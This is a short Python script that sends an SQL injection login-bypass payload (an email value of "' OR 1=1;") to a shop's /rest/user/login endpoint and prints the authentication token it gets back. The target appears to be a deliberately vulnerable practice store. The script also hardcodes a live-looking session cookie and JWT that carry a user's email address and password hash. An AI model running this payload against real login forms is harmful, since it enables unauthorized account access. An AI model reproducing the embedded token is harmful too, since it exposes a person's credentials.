import requests
from dotenv import load_dotenv
import os
import json as JSON

load_dotenv();

base_url  = os.environ.get("BASE_URL");

url = f"{base_url}/rest/user/login"
my_object = {"email":"' OR 1=1;","password":"123"}#

header = {
    'Host': 'myshop.cstad.shop',
    'Cookie': 'language=en; cookieconsent_status=dismiss; continueCode=gXWy6ZqWnJPaLzDVMr53wkbl7voAJlfprGY1jR8p6NemQXKg942BxOyEKr9q; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJwaXU5MDY2QGdtYWlsLmNvbSIsInBhc3N3b3JkIjoiODI3Y2NiMGVlYThhNzA2YzRjMzRhMTY4OTFmODRlN2IiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoidW5kZWZpbmVkIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy8yMi5qcGciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMTEtMjMgMDI6NTE6MjIuODcwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMTEtMjMgMDM6MDA6NTIuNTgxICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTcwMDcwOTk4Nn0.qXQ-r-0aJvmw0kcxJ_qBQNkgU65ENLXx_XW8YcgWxlxHy0GZ1y75YuHvW3es-ENY8zKavUiS4cB-1YKId6jg_m2uZ3zh9ORgH5iHKBNP9EaIpMr8FPCs0MgybTIE9Jf_R7G9DZWa7_Mvi9WCd220e2oQBZkEEi5F9A5k0CQrLHM',
    'Sec-Ch-Ua': '"Chromium";v="117", "Not;A=Brand";v="8"',
    'Accept': '*/*',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://myshop.cstad.shop/loginn',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close'
}

def get_authorization(url,object):
    try:
        p = requests.post(url=url,json=object)
        # return p.json()["authentication"]["token"];
        return JSON.dumps(p.json(),indent=4);
    except Exception as error:
        print("You provided with an invalid URL!")
u = str(input("Insert URL with inputable Form: "))
print(get_authorization(url, my_object))



